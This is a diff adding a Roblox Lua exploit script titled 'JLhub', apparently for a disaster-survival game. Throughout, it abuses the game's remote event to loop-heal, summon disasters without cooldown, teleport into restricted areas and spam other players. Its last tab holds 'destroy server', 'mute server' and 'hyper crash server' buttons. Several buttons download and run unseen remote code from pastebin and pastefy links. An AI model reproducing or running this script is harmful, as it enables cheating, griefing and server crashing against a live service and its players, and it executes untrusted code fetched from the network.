@@ -1,0 +1,605 @@
+local syn = getgenv().syn
+getgenv().syn = false
+
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()local Window = OrionLib:MakeWindow({Name = "JLhub", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})local Tab = Window:MakeTab({
+    Name = "important",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+}) Tab:AddButton({
+    Name = "remove broken bones f2p",
+    Callback = function()
+              game.Players.LocalPlayer.BonesEnabled:destroy()
+      end    
+}) Tab:AddButton({
+    Name = "stop auto enter map",
+    Callback = function()
+              _G.toggle = false
+      end    
+}) Tab:AddButton({
+    Name = "auto enter map",
+    Callback = function()
+              _G.toggle = true
+
+while _G.toggle do
+wait(1)
+local args = {
+    [1] = {
+        ["reason"] = "Teleport"
+    }
+}
+
+game:GetService("ReplicatedStorage").Assets.Signals.Event:FireServer(unpack(args))
+
+end
+      end    
+}) Tab:AddButton({
+    Name = "loop heal chocy milkie (50) no need tool",
+    Callback = function()
+           while wait() do
+local args = {
+    [1] = {
+        ["A"] = 50,
+        ["B"] = false,
+        ["C"] = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Chocolate Milk"),
+        ["reason"] = "UseItem"
+    }
+}
+
+game:GetService("ReplicatedStorage").Assets.Signals.Event:FireServer(unpack(args))
+end
+      end    
+})  Tab:AddButton({
+    Name = "loop heal premium cup (don't need tool)",
+    Callback = function()
+              while wait() do
+local args = {
+    [1] = {
+        ["A"] = 70,
+        ["B"] = false,
+        ["C"] = game:GetService("Players").LocalPlayer.Character.Goblet,
+        ["reason"] = "UseItem"
+    }
+}
+
+game:GetService("ReplicatedStorage").Assets.Signals.Event:FireServer(unpack(args))
+end
+      end    
+}) Tab:AddButton({
+    Name = "loop use bloxy cola (50)",
+    Callback = function()
+              while wait() do
+local args = {
+    [1] = {
+        ["A"] = 50,
+        ["B"] = false,
+        ["C"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Bloxy Cola"),
+        ["reason"] = "UseItem"
+    }
+}
+
+game:GetService("ReplicatedStorage").Assets.Signals.Event:FireServer(unpack(args))
+end
+      end    
+}) Tab:AddButton({
+    Name = "loop use cheezeburger (50)",
+    Callback = function()
+              while wait() do
+local args = {
+    [1] = {
+        ["A"] = 50,
+        ["B"] = false,
+        ["C"] = game:GetService("Players").LocalPlayer.Character.Cheeseburger,
+        ["reason"] = "UseItem"
+    }
+}
+
+game:GetService("ReplicatedStorage").Assets.Signals.Event:FireServer(unpack(args))
+end
+      end    
+}) Tab:AddButton({
+    Name = "loop use icecream (50)",
+    Callback = function()
+              while wait() do
+local args = {
+    [1] = {
+        ["A"] = 50,
+        ["B"] = false,
+        ["C"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Ice Cream"),
+        ["reason"] = "UseItem"
+    }
+}
+
+game:GetService("ReplicatedStorage").Assets.Signals.Event:FireServer(unpack(args))
+end
+      end    
+}) Tab:AddButton({
+    Name = "loop use pizza (50)",
+    Callback = function()
+              while wait() do
+local args = {
+    [1] = {
+        ["A"] = 50,
+        ["B"] = false,
+        ["C"] = game:GetService("Players").LocalPlayer.Character.Pizza,
+        ["reason"] = "UseItem"
+    }
+}
+
+game:GetService("ReplicatedStorage").Assets.Signals.Event:FireServer(unpack(args))
+end
+      end    
+}) Tab:AddButton({
+    Name = "loop use taco (50)",
+    Callback = function()
+              while wait() do
+local args = {
+    [1] = {
+        ["A"] = 50,
+        ["B"] = false,
+        ["C"] = game:GetService("Players").LocalPlayer.Character.Taco,
+        ["reason"] = "UseItem"
+    }
+}
+
+game:GetService("ReplicatedStorage").Assets.Signals.Event:FireServer(unpack(args))
+end
+      end    
+}) Tab:AddButton({
+    Name = "loop use sandwich (50)",
+    Callback = function()
+              while wait() do
+local args = {
+    [1] = {
+        ["A"] = 50,
+        ["B"] = false,
+        ["C"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Space Sandwich"),
+        ["reason"] = "UseItem"
+    }
+}
+
+game:GetService("ReplicatedStorage").Assets.Signals.Event:FireServer(unpack(args))
+end
+      end    
+}) local Tab = Window:MakeTab({
+    Name = "auto survive",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+}) Tab:AddButton({
+    Name = "fly gui (activate fly before using auto survive)",
+    Callback = function()
+              loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
+      end    
+}) Tab:AddButton({
+    Name = "auto survive (TP)",
+    Callback = function()
+              loadstring(game:HttpGet("https://pastefy.app/c1iHHveA/raw"))()
+      end    
+}) Tab:AddButton({
+    Name = "auto survive (slow)",
+    Callback = function()
+              loadstring(game:HttpGet("https://pastefy.app/SvH2GCcQ/raw"))()
+      end    
+}) Tab:AddButton({
+    Name = "stop loop auto survive",
+    Callback = function()
+              _G.tweening = false
+      end    
+}) local Tab = Window:MakeTab({
+    Name = "no cd summon",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+}) Tab:AddButton({
+    Name = "summon tsunami",
+    Callback = function()
+              local args = {
+    [1] = {
+        ["A"] = "Tsunami",
+        ["reason"] = "SummonDisasterCoins"
+    }
+}
+
+game:GetService("ReplicatedStorage").Assets.Signals.Event:FireServer(unpack(args))
+
+      end    
+}) Tab:AddButton({
+    Name = "summon zombies",
+    Callback = function()
+              local args = {
+    [1] = {
+        ["A"] = "Zombie Invasion",
+        ["reason"] = "SummonDisasterCoins"
+    }
+}
+
+game:GetService("ReplicatedStorage").Assets.Signals.Event:FireServer(unpack(args))
+
+      end    
+}) Tab:AddButton({
+    Name = "summon nuke (HAS NO NOTI SO DON'T SPAM)",
+    Callback = function()
+              local args = {
+    [1] = {
+        ["A"] = "Atomic Bomb",
+        ["reason"] = "SummonDisasterCoins"
+    }
+}
+
+game:GetService("ReplicatedStorage").Assets.Signals.Event:FireServer(unpack(args))
+
+      end    
+}) Tab:AddButton({
+    Name = "summon lava flood",
+    Callback = function()
+              local args = {
+    [1] = {
+        ["A"] = "Lava Flood",
+        ["reason"] = "SummonDisasterCoins"
+    }
+}
+
+game:GetService("ReplicatedStorage").Assets.Signals.Event:FireServer(unpack(args))
+
+      end    
+}) Tab:AddButton({
+    Name = "summon black hole",
+    Callback = function()
+              local args = {
+    [1] = {
+        ["A"] = "Black Hole",
+        ["reason"] = "SummonDisasterCoins"
+    }
+}
+
+game:GetService("ReplicatedStorage").Assets.Signals.Event:FireServer(unpack(args))
+
+      end    
+}) Tab:AddButton({
+    Name = "summon alien invasion",
+    Callback = function()
+              local args = {
+    [1] = {
+        ["A"] = "Alien Invasion",
+        ["reason"] = "SummonDisasterCoins"
+    }
+}
+
+game:GetService("ReplicatedStorage").Assets.Signals.Event:FireServer(unpack(args))
+
+      end    
+}) Tab:AddButton({
+    Name = "summon pollution",
+    Callback = function()
+              local args = {
+    [1] = {
+        ["A"] = "Pollution",
+        ["reason"] = "SummonDisasterCoins"
+    }
+}
+
+game:GetService("ReplicatedStorage").Assets.Signals.Event:FireServer(unpack(args))
+
+      end    
+}) Tab:AddButton({
+    Name = "summon acid rain",
+    Callback = function()
+              local args = {
+    [1] = {
+        ["A"] = "Acid Rain",
+        ["reason"] = "SummonDisasterCoins"
+    }
+}
+
+game:GetService("ReplicatedStorage").Assets.Signals.Event:FireServer(unpack(args))
+
+      end    
+}) Tab:AddButton({
+    Name = "summon meteors",
+    Callback = function()
+              local args = {
+    [1] = {
+        ["A"] = "Meteors",
+        ["reason"] = "SummonDisasterCoins"
+    }
+}
+
+game:GetService("ReplicatedStorage").Assets.Signals.Event:FireServer(unpack(args))
+
+      end    
+}) Tab:AddButton({
+    Name = "summon hurricane",
+    Callback = function()
+              local args = {
+    [1] = {
+        ["A"] = "Hurricane",
+        ["reason"] = "SummonDisasterCoins"
+    }
+}
+
+game:GetService("ReplicatedStorage").Assets.Signals.Event:FireServer(unpack(args))
+
+      end    
+}) Tab:AddButton({
+    Name = "summon flood",
+    Callback = function()
+              local args = {
+    [1] = {
+        ["A"] = "Flood",
+        ["reason"] = "SummonDisasterCoins"
+    }
+}
+
+game:GetService("ReplicatedStorage").Assets.Signals.Event:FireServer(unpack(args))
+
+      end    
+}) local Tab = Window:MakeTab({
+    Name = "auto collect unfinished",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+}) Tab:AddButton({
+    Name = "auto search (use during map vote to let the set up load)",
+    Callback = function()
+              loadstring(game:HttpGet("https://pastebin.com/raw/9Mevhp7C"))()
+      end    
+}) Tab:AddButton({
+    Name = "auto press button",
+    Callback = function()
+              while task.wait() do for i,v in next, workspace:GetDescendants() do if v.IsA(v,'ProximityPrompt') then fireproximityprompt(v) end end end
+      end    
+}) Tab:AddButton({
+    Name = "fly gui (activate before auto search otherwise u break bones)",
+    Callback = function()
+              loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
+      end    
+}) Tab:AddButton({
+    Name = "stop auto search",
+    Callback = function()
+              _G.tweening = false
+      end    
+}) local Tab = Window:MakeTab({
+    Name = "bunker",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+}) Tab:AddButton({
+    Name = "tp into bunker",
+    Callback = function()
+              local teleport_table = {
+    location1 = Vector3.new(75488.84375, 31958.30859375, -146.71038818359375), -- your desired position
+    location2 = Vector3.new()  -- your desired position
+}
+
+local tween_s = game:GetService('TweenService')
+local tweeninfo = TweenInfo.new(0,Enum.EasingStyle.Linear)
+
+local lp = game.Players.LocalPlayer
+
+function bypass_teleport(v)
+    if lp.Character and 
+    lp.Character:FindFirstChild('HumanoidRootPart') then
+        local cf = CFrame.new(v)
+        local a = tween_s:Create(lp.Character.HumanoidRootPart,tweeninfo,{CFrame=cf})
+        a:Play()
+        -- a.Completed:Wait()
+        -- print('Teleporting Done!')
+    end
+end
+
+bypass_teleport(teleport_table.location1)
+      end    
+}) Tab:AddButton({
+    Name = "loop enter bunker",
+    Callback = function()
+              _G.tweening = true
+
+spawn(function( )
+while _G.tweening == true do
+local teleport_table = {
+    location1 = Vector3.new(75488.84375, 31958.30859375, -146.71038818359375), -- your desired position
+    location2 = Vector3.new()  -- your desired position
+}
+
+local tween_s = game:GetService('TweenService')
+local tweeninfo = TweenInfo.new(0,Enum.EasingStyle.Linear)
+
+local lp = game.Players.LocalPlayer
+
+function bypass_teleport(v)
+    if lp.Character and 
+    lp.Character:FindFirstChild('HumanoidRootPart') then
+        local cf = CFrame.new(v)
+        local a = tween_s:Create(lp.Character.HumanoidRootPart,tweeninfo,{CFrame=cf})
+        a:Play()
+        -- a.Completed:Wait()
+        -- print('Teleporting Done!')
+    end
+end
+
+bypass_teleport(teleport_table.location1)
+wait(2)
+end
+end)
+      end    
+}) Tab:AddButton({
+    Name = "stop auto enter bunker",
+    Callback = function()
+              _G.tweening = false
+      end    
+}) local Tab = Window:MakeTab({
+	Name = "jail",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+}) Tab:AddButton({
+	Name = "tp back to earth",
+	Callback = function()
+      		local teleport_table = {
+    location1 = Vector3.new(-190.06617736816406, 352.81634521484375, -297.1030578613281), -- your desired position
+    location2 = Vector3.new()  -- your desired position
+}
+
+local tween_s = game:GetService('TweenService')
+local tweeninfo = TweenInfo.new(0,Enum.EasingStyle.Linear)
+
+local lp = game.Players.LocalPlayer
+
+function bypass_teleport(v)
+    if lp.Character and 
+    lp.Character:FindFirstChild('HumanoidRootPart') then
+        local cf = CFrame.new(v)
+        local a = tween_s:Create(lp.Character.HumanoidRootPart,tweeninfo,{CFrame=cf})
+        a:Play()
+        -- a.Completed:Wait()
+        -- print('Teleporting Done!')
+    end
+end
+
+bypass_teleport(teleport_table.location1)
+  	end    
+}) Tab:AddButton({
+    Name = "tp inside jail",
+    Callback = function()
+              local teleport_table = {
+    location1 = Vector3.new(103680.765625, 31953.91015625, -141.88365173339844), -- your desired position
+    location2 = Vector3.new()  -- your desired position
+}
+
+local tween_s = game:GetService('TweenService')
+local tweeninfo = TweenInfo.new(0,Enum.EasingStyle.Linear)
+
+local lp = game.Players.LocalPlayer
+
+function bypass_teleport(v)
+    if lp.Character and 
+    lp.Character:FindFirstChild('HumanoidRootPart') then
+        local cf = CFrame.new(v)
+        local a = tween_s:Create(lp.Character.HumanoidRootPart,tweeninfo,{CFrame=cf})
+        a:Play()
+        -- a.Completed:Wait()
+        -- print('Teleporting Done!')
+    end
+end
+
+bypass_teleport(teleport_table.location1)
+      end    
+}) Tab:AddButton({
+    Name = "tp outside jail",
+    Callback = function()
+              local teleport_table = {
+    location1 = Vector3.new(103656.484375, 31953.814453125, -140.7875518798828), -- your desired position
+    location2 = Vector3.new()  -- your desired position
+}
+
+local tween_s = game:GetService('TweenService')
+local tweeninfo = TweenInfo.new(0,Enum.EasingStyle.Linear)
+
+local lp = game.Players.LocalPlayer
+
+function bypass_teleport(v)
+    if lp.Character and 
+    lp.Character:FindFirstChild('HumanoidRootPart') then
+        local cf = CFrame.new(v)
+        local a = tween_s:Create(lp.Character.HumanoidRootPart,tweeninfo,{CFrame=cf})
+        a:Play()
+        -- a.Completed:Wait()
+        -- print('Teleporting Done!')
+    end
+end
+
+bypass_teleport(teleport_table.location1)
+      end    
+}) local Tab = Window:MakeTab({
+	Name = "noti spammer",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+}) Tab:AddButton({
+	Name = "click this before paralyze notis",
+	Callback = function()
+      		while wait(2) do
+local args = {
+    [1] = {
+        ["reason"] = "Paralyzed"
+    }
+}
+
+game:GetService("ReplicatedStorage").Assets.Signals.Event:FireServer(unpack(args))
+end
+  	end    
+}) Tab:AddButton({
+	Name = "call for help without being paralyzed",
+	Callback = function()
+      		local args = {
+    [1] = {
+        ["reason"] = "CallForHelp"
+    }
+}
+
+game:GetService("ReplicatedStorage").Assets.Signals.Event:FireServer(unpack(args))
+
+  	end    
+}) Tab:AddButton({
+	Name = "spam call hell",
+	Callback = function()
+      		_G.toggle = true
+
+while _G.toggle do
+wait( )
+local args = {
+    [1] = {
+        ["reason"] = "CallForHelp"
+    }
+}
+
+game:GetService("ReplicatedStorage").Assets.Signals.Event:FireServer(unpack(args))
+end
+  	end    
+}) Tab:AddButton({
+	Name = "stop spam call for help (also stops destroy server)",
+	Callback = function()
+      		_G.toggle = false
+  	end    
+}) Tab:AddButton({
+	Name = "destroy server",
+	Callback = function()
+      		_G.toggle = true
+
+while _G.toggle do
+wait( )
+loadstring(game:HttpGet("https://pastebin.com/raw/AALiJShJ"))()
+end
+  	end    
+}) Tab:AddButton({
+	Name = "delete carry button on urself",
+	Callback = function()
+      		game.Players.LocalPlayer.PlayerGui.ProximityPrompts:destroy()
+  	end    
+}) Tab:AddButton({
+	Name = "rejoin (if the lag is still there for you or any other issues)",
+	Callback = function()
+      		-- rejoin		
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local Rejoin = coroutine.create(function()
+    local Success, ErrorMessage = pcall(function()
+        TeleportService:Teleport(game.PlaceId, LocalPlayer)
+    end)
+
+    if ErrorMessage and not Success then
+        warn(ErrorMessage)
+    end
+end)
+
+coroutine.resume(Rejoin)
+  	end    
+}) Tab:AddButton({
+	Name = "mute server (press once)",
+	Callback = function()
+      		loadstring(game:HttpGet("https://pastebin.com/raw/5gjuSZwz"))()
+  	end    
+}) Tab:AddButton({
+	Name = "hyper crash server (finished but im still pushing its limit)",
+	Callback = function()
+      		loadstring(game:HttpGet("https://pastebin.com/raw/JEN9CmYZ"))()
+  	end    
+})
+
+getgenv().syn = syn
